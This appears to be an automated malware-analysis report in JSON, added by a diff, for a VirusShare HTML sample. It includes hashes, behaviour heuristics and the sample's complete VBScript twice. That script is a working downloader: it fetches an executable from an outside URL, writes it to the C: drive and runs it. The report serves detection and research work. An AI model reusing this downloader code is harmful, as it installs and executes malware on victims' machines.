@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Microsoft.XMLHTTP": "May download files from the Internet",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Write": "May write to a file",
+            "chr": "May attempt to obfuscate specific str",
+            "open": "May open a file",
+            "run": "May run an executable file or a system command",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "<script language=\"vbscript\">\nself.MoveTo 5000,5000\nset x = CreateObject(\"Microsoft.XMLHTTP\")\nx.open \"GET\", \"http://hard-virgins.com/dl/load.exe\", false\nx.send\ncs = x.responseBody\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\npth = \"c:\\loadk32.exe\"\nSet f = fso.CreateTextFile(pth, ForWriting)\nfor i = 0 to UBound(cs)\nc = ascb(midb(cs, i+1, 1))\nf.Write chr(c)\nnext\nf.close\nSet shell=CreateObject(\"WScript.Shell\")\nshell.run(pth)\nwindow.close\n</script>"
+    },
+    "filename": "VirusShare_3909e4a3236c3d475e14967f5847aad1",
+    "filesize": 455,
+    "filetype": "HTML document, ASCII text",
+    "hashes": {
+        "md5": "3909e4a3236c3d475e14967f5847aad1",
+        "sha1": "543998530f82ecb199c786e2a9bc51f2900daa94",
+        "sha256": "2fc08ca98bfbcf85a5c8b59f9523341d838c0e38638a939fed4a25934c6dd89a"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<script language=\"vbscript\">",
+            "self.MoveTo 5000,5000",
+            "set x = CreateObject(\"Microsoft.XMLHTTP\")",
+            "x.open \"GET\", \"http://hard-virgins.com/dl/load.exe\", false",
+            "x.send",
+            "cs = x.responseBody",
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "pth = \"c:\\loadk32.exe\"",
+            "Set f = fso.CreateTextFile(pth, ForWriting)",
+            "for i = 0 to UBound(cs)",
+            "c = ascb(midb(cs, i+1, 1))",
+            "f.Write chr(c)",
+            "next",
+            "f.close",
+            "Set shell=CreateObject(\"WScript.Shell\")",
+            "shell.run(pth)",
+            "window.close",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://hard-virgins.com/dl/load.exe"
+        ]
+    },
+    "time": "0:00:00.264563",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
